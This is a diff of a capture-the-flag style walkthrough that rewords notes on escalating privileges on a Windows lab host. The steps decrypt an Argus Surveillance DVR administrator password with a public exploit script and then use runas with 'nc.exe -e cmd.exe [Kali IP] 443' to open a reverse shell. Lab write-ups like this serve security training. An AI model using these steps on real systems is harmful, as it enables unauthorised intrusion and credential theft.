@@ -258,69 +258,77 @@ Enumerated top 200 UDP ports:
 
 - To copy the Python script to our Kali computer, we type "searchsploit -m windows/local/50130.py".
   
-#### - Typed "cat 50130.py" and found the following contents:
-
+- We type "cat 50130.py" and the contents appeared as follows:
+  
 ![](Images/Pasted%20image%2020221009192437.png)
 
-#### - Ran a privilege escalation script but couldn't find anything interesting
+- We try a privilege escalation script, but nothing seems worth looking into.
 
-#### - Typed "dir /a" in the C: directory to find any hidden directorys/files and found hidden directory "ProgramData"
+- To locate any hidden files or directories, we type "dir /a" into the C: directory. This allowed us to locate the hidden directory ProgramData.
 
 ![](Images/Pasted%20image%2020221009192857.png)
 #FindHiddenWindowsDirectorys
 
-#### - Changed to directory "ProgramData" and found the following directories. I then navigated into the "PY_Software" directory:
-
+- We navigate to the "ProgramData" directory and discover the following directory:
+  
 ![](Images/Pasted%20image%2020221009193059.png)
 
-#### - I then found a "Argus Serveillance DVR" directory and navigated into it:
+- We access the "PY_Software" directory.
+  
+-We locate and navigate to the "Argus Surveillance DVR" directory:
 
 ![](Images/Pasted%20image%2020221009193752.png)
 
-#### - I then found the DVRParams (.ini) configuration file:
-
+- Next, we locate the configuration file DVRParams (.ini):
+  
 ![](Images/Pasted%20image%2020221009194221.png)
 #WindowsProgramConfigurationFile 
 
-#### - I then typed "type DVRParams.ini" to read the contents of the configuration file and found the following "adminstrator" user and hashed or encrypted password "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8":
+- After that, we enter "type DVRParams.ini" to access the configuration file's contents and discover the hashed or encrypted password "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8" along with the "administrator" user:
+
 ![](Images/Pasted%20image%2020221009201025.png)
 
-#### - Attempted to type "hashid ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8" to identify the hash but received an Uknown hash:
-
+- When trying to find the hash, we type "hashid ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8" but returned an unknown hash instead:
+  
 ![](Images/Pasted%20image%2020221009201200.png)
 	#IdentifyHashID
 
-#### - Remembered the "Weak password encryption" exploit/script found earlier. Typed "vim 50130.py" and input the encrypted password into the script:
-
+- We recall the previously discovered "weak password encryption" script/exploit. We enter the encrypted password into the script and type "vim 50130.py":
+  
 ![](Images/Pasted%20image%2020221009201411.png)
 
-#### - Typed "python 50130.py" to run the script and found the mostly decrypted password to be "14WatchD0g". Although the script is unable to decode the last string of characters:
-
+- After entering "python 50130.py" to launch the script, "14WatchD0g" was discovered to be the password that had been largely decoded. Even so, the last character string is unintelligible to the script:
+  
 ![](Images/Pasted%20image%2020221009201544.png)
 
-#### - Reading through the script we find the coder of the script was "too lazy to add special characters":
-
+- We discover that the programmer was "too lazy to add special characters" after reading the script:
+  
 ![](Images/Pasted%20image%2020221009201710.png)
 
-## - I input a character one by 
-#### - Navigated to the viewer users directory and found the netcat executable was installed:
-
+- We locate the installed netcat executable by navigating to the viewer users directory:
+  
 ![](Images/Pasted%20image%2020221009202007.png)
 
-#### - Setup a netcat listener to listen on port 443 
-
-#### -As we are going to attempt to login as a different user (Administrator) I googled "how to run a program as a different user in windows command line" :
-
+- We configure a netcat listener on port 443.
+  
+- We looked into the syntax needed to utilize the "runas" command in order to run a command as a different user.
+  
 ![](Images/Pasted%20image%2020221009202220.png)
 
-#### - Per the web page it showed to run the following command example "runas /user:admin "C:\Windows\notepad.exe"
+- The webpage instructs users to execute the command "runas /user:admin "C:\Windows\notepad.exe"."
 
 ![](Images/Pasted%20image%2020221009202314.png)
 - [ ] 
 ## Privilege Escalation vector
 ## Runas command to login with a different user in CMD
 
-#### - Typed runas /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443" and password 14WatchD0g$ (can also type runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443") and received a cmd promp running as Administrator:
+- We type the following command and receive a CMD prompt running as Administrator:
+
+"runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443"
+
+- We are prompted for the administrator's password.
+
+- We tried every special character after discovering the partial password "14WatchD0g" until it finally worked and we received a CMD prompt as Administrator:
 
 ![](Images/Pasted%20image%2020221009202519.png)
 
